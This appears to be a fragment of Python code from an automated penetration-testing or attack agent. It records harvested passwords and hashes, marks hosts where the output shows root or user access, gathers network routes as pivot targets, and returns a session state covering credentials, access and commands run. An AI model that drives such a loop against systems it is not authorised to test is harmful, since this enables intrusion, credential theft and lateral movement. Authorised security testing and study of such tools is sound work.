            self.credentials.append({
                "type": cred.credential_type,
                "value": cred.password or cred.hash_value,
                "username": cred.username,
            })
            print(f"  \033[91m🔑 {cred.credential_type}: {cred.username}: {cred.password or cred.hash_value[:30]}\033[0m")

        if "uid=0" in output:
            for h in self.hosts:
                if h in command:
                    self.access_map[h] = "root"
        elif "uid=" in output:
            for h in self.hosts:
                if h in command:
                    self.access_map[h] = "user"

        routes = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", output)
        for route in routes:
            if route not in self.pivoted and route != self.target:
                self.pivoted.append(route)

    def _get_state(self) -> dict:
        return {
            "session_id": self.session_id,
            "target": self.target,
            "known_hosts": self.hosts,
            "known_services": self.services,
            "credentials": self.credentials,
            "access_map": self.access_map,
            "pivoted_networks": self.pivoted,
            "failed_attempts": list(self.failed),
            "commands_run": self.commands_run,
            "cycle": len(self.commands_run),
        }
